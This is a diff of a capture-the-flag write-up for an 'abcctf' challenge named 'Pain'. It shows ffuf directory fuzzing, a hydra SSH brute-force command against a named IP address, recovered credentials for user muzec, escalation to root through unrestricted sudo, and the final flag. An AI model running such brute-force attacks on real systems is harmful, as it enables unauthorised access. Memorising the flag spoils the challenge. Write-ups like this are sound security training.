@@ -23,8 +23,7 @@ Hmmmm we got an IP and a port, let's us nmap to check and  know what service is 
 ┌──(n16hth4wk㉿n16hthawk-sec)-[~]
 └─$ nmap -sC -sV  185.203.119.220 -p 8003  
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-05 09:54 CDT
-Nmap scan report for 185.203.119.220
-Host is up (0.20s latency).
+Nmap scan report for 185.203.119.220 Host is up (0.20s latency).
 PORT     STATE SERVICE VERSION
 8003/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
 |_http-title: Apache2 Ubuntu Default Page: It works
@@ -78,7 +77,7 @@ wordpress               [Status: 301, Size: 329, Words: 20, Lines: 10, Duration:
 :: Progress: [28278/28278] :: Job [1/1] :: 95 req/sec :: Duration: [0:02:46] :: Errors: 22 ::
 ```
 
-nice we got somethings interesting but trust me you'll only want to take a look at the webdav directory.
+nice we got somethings interesting but trust me you'll only want to take a look at the webdav directory. cause our sharingan 👀 saw through it that the rest was a rabit hole 😂, like Itachi saying "sono sharingan omaewa doko made mieteiru" 👀
 
 ![4](https://user-images.githubusercontent.com/87468669/194121126-27a27eea-fa0f-4182-a088-adcd2572aaa4.png)
 
@@ -195,6 +194,158 @@ Nice we now know port 2222 is an ssh port, so let's go back to the first IP whic
 
 ![image](https://user-images.githubusercontent.com/87468669/194166210-d862130f-5678-4260-b308-ad6179b5f481.png)
 
-so we have the web service open and all the quotes here are about pain💉💉💉. But regardless we've got magekyou sharingan 😂 😂. we either put this challenge under genjitsu or izami 😂. Enough with that let's move on. 
-Checking the source page, got nothing this is where our sharingan aka ffuf will work for us 
+so we have the web service open and all the quotes here are about pain💉💉💉. But regardless we've got magekyou sharingan 😂 😂. we either put this challenge under genjitsu or izami 😂. Enough with that let's move on.
+
+![image](https://user-images.githubusercontent.com/87468669/194230661-16ebbca9-c9d7-4cec-b830-7ec2573c3d00.png)
+
+Checking the source page, got nothing this is where our sharingan aka ffuf fuzzer for us burst hidden directories
+
+```
+┌──(n16hth4wk㉿n16hthawk-sec)-[~]
+└─$ ffuf -u "http://185.203.119.220:8080/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .bak,.txt,.php,.sql,.sh,.phtml,.tar -fs 582
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.5.0 Kali Exclusive <3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://185.203.119.220:8080/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+ :: Extensions       : .bak .txt .php .sql .sh .phtml .tar 
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+ :: Filter           : Response size: 582
+________________________________________________
+
+pain.bak                [Status: 200, Size: 108, Words: 1, Lines: 17, Duration: 173ms]
+pain.txt                [Status: 200, Size: 22, Words: 4, Lines: 2, Duration: 170ms]
+```
+
+Cool we can see two directories here, let's check em out. pain.bak is a downloadable file so let's download it 
+
+![image](https://user-images.githubusercontent.com/87468669/194245782-5b474ad0-0a3c-4d33-93ab-83d88e877313.png)
+
+let's go and check pain.txt on our browser
+
+![image](https://user-images.githubusercontent.com/87468669/194233891-dc47fa2f-23e9-45cc-9fdb-5dc45d0c4a84.png)
+
+Maybe secret in LEET. 🤔 🤔 🤔 niisan what do you mean here... anyways let's check the content of pain.bak
+
+```
+┌──(n16hth4wk㉿n16hthawk-sec)-[~/abcctf/Pain]
+└─$ cat pain.bak                                                                             
+root
+pain
+aaliyah
+aaren
+aarika
+aaron
+aartjan
+aarushi
+abagael
+abagail
+abahri
+abbas
+muzec
+abcctf
+R4T
+rudefish
+
+```
+pain.bak contains somenames, why don't use hydra to try out this names on ssh if any would work 
+
+![image](https://user-images.githubusercontent.com/87468669/194253794-e4090913-7f87-46c3-a2dc-a3c0d0863caf.png)
+
+Boom! we got a username and password for ssh. command used ```hydra -s 2222 -L pain.bak -P pain.bak 185.203.119.220 ssh```
+
+let's login ssh with the username and password found above
+
+![image](https://user-images.githubusercontent.com/87468669/194261568-c335a08c-f9db-4b23-993f-03bf69f05e4d.png)
+
+We are in now let's escalate privs to root. 
+
+![image](https://user-images.githubusercontent.com/87468669/194264733-8afe4439-5369-49dd-a1af-06293edaa3d3.png)
+
+Broooo i got stucked here for hours, and i was running out of chakra 😂 😂... i stared at the "Maybe secret in LEET." for hours omo nothing, i tried su rudefish with password secret omo e no work, su muzec with password secret still the same, i tried secret in leet for (53cr37, 53CR37...) none worked. I was like omo this is truly pain. i used my last resort susano 😂. i looked at the pain.bak again and said why don't i try bruteforce muzec or rudefish password for ssh but in another format. 
+Let's try it in reverse format
+
+![image](https://user-images.githubusercontent.com/87468669/194272097-e4e7d740-4151-4b4c-ab23-35763dcd69bd.png)
+
+click on reverse you should get the reverse form of the words 
+
+![image](https://user-images.githubusercontent.com/87468669/194272466-4c5699c5-7758-4fb4-b2cf-4c54edb221b5.png)
+
+```
+hsifedur
+T4R
+ftccba
+cezum
+sabba
+irhaba
+liagaba
+leagaba
+ihsuraa
+najtraa
+noraa
+akiraa
+neraa
+hayilaa
+niap
+toor
+```
+now let's copy them and put the in a file. then we use hydra to bruteforce again this time we are using the reversed wordlist 
+
+![image](https://user-images.githubusercontent.com/87468669/194273848-e6d6d3ee-ee71-441f-be7f-4f7770e4f1f8.png)
+
+Boom! we got the password for muzec, i did the same for rudefish but trust me you don't want to be trolled 😂 after coming this far.
+su muzec with password: cezum
+
+![image](https://user-images.githubusercontent.com/87468669/194276461-7bb7f50c-ec64-4c5b-8a91-dbde5e617399.png)
+
+we are in let's escalate privs to root.
+
+![image](https://user-images.githubusercontent.com/87468669/194276932-a013f088-ae27-4378-9b7f-7200192d5c88.png)
+
+```
+muzec@3470e9a4bace:~$ sudo -l
+muzec@3470e9a4bace:~$ which sudo
+/usr/bin/sudo
+muzec@3470e9a4bace:~$ /usr/bin/sudo -l
+[sudo] password for muzec: 
+Matching Defaults entries for muzec on 3470e9a4bace:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User muzec may run the following commands on 3470e9a4bace:
+    (ALL : ALL) ALL
+muzec@3470e9a4bace:~$ /usr/bin/sudo su
+root@3470e9a4bace:/home/muzec# 
+root@3470e9a4bace:/home/muzec# 
+
+```
+Now we are root let's hunt for the flag.
+
+![image](https://user-images.githubusercontent.com/87468669/194278486-52823a44-af76-4b68-b3bc-7fe5002dd8d9.png)
+
+there we have our flag
+
+Final Flag :- abcctf{HYDr4_r3V3r53_15_C001_r16H7}
+
+
+
+
+
+
+
+
 
